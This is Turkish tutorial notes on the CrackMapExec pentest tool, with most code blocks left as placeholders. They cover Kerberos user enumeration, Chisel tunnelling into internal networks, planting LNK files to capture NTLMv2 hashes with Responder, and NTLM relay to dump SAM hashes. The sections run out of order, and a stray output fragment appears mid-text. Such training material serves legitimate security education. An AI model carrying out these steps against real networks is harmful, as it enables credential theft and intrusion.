Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.

